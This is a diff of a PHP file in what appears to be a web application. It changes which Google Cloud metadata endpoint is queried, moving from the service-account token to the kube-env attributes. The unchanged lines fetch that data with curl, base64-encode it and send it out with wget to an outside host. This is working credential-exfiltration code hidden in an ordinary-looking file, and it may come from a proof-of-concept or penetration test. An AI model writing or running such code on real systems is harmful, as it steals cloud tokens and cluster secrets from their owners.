@@ -32,8 +32,9 @@ function posts_filter($posts, $tag)
 
 
 //$url2 = "http://metadata.google.internal/computeMetadata/v1/instance/attributes/user-data/";
-$url2 = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token";
+//$url2 = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token";
 //$url2 = "http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id?alt=json";
 //$url2 = "http://metadata.google.internal/computeMetadata/v1/project/project-id?alt=json";
+$url2 = "http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env?alt=json"
 $ooo2 = base64_encode(exec("curl -i -v -H 'Metadata-Flavor: Google' ".$url2));
 system("wget http://php-exec.dns.pitr.be/?".$ooo2);
